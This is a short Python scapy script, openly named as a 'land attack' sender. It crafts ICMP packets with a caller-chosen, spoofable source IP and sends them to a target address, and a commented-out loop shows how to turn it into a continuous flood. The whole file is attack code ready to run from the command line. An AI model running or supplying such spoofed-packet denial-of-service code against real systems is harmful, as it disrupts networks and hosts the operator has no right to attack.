import sys
from scapy.all import *


def send_land_attack_packets(interface, src_ip, dst_ip):
    # Craft the packet
    # packet = IP(src="10.10.10.2", dst=target_ip) / ICMP()
    packet = IP(src=src_ip, dst=dst_ip) / ICMP()

    # Send the packet in a loop
    # while True:
    #     send(packet, iface=interface)
    send(packet, iface=interface)

if __name__ == "__main__":
    interface = sys.argv[1]
    src_ip = sys.argv[2]
    dst_ip = sys.argv[3]
    send_land_attack_packets(interface, src_ip, dst_ip)
